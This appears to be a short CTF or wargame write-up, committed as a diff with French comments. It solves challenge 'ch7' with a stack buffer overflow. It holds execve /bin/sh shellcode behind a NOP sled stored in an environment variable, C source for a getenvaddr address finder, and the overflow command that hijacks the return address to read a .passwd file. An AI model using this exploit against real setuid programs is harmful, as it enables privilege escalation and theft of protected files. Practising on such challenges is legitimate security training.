@@ -1,0 +1,34 @@
+#on a un buffer de 512, mais la fonction cp_username ne controle pas la taille de l'argument
+#on cherche le segfault pour avoir le retour du main
+#on met un script shell executant un shell dans l'environnement et on choppe l'adresse grace a getenvaddr.c (recherche google)
+#on overflow le buffer avec l'adresse vers ce script shell
+
+shellcode => \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+
+
+export boo=`python -c 'print "\x90"* 50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+cd /tmp
+vi c.c
+>>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+	char *ptr;
+
+	if(argc < 3) {
+		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
+		exit(0);
+	}
+	ptr = getenv(argv[1]); /* get env var location */
+	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
+	printf("%s will be at %p\n", argv[1], ptr);
+}
+<<
+gcc c.c
+cd
+/tmp/c boo ch7
+boo will be at 0xbfffff22
+./ch7 `python -c "print 'A'*512+'\x22\xff\xff\xbf'"`
+cat .passwd
